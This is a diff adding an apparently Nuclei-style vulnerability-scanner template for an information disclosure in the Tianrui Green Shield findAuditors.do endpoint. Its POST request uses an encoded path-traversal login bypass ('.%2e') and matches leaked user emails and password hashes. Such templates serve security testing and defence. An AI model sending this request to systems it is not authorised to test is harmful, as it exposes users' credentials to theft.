@@ -1,0 +1,34 @@
+id: poc-yaml-tipray-gsas-findauditors-do-info-leak
+
+info:
+  name: Tianrui Green Shield findAuditors.do Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    Tianrui Green Shield system findAuditors.do endpoint is vulnerable to information disclosure, revealing user details such as firstName, email, password, and encoding type.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/trwfe/login.jsp/.%2e/config/findAuditors.do"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"firstName\":"
+          - "\"email\":"
+          - "\"pwdEncodeType\":"
+      - type: regex
+        part: body
+        regex:
+          - "\"password\":\"([a-z0-9]{32})\""
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
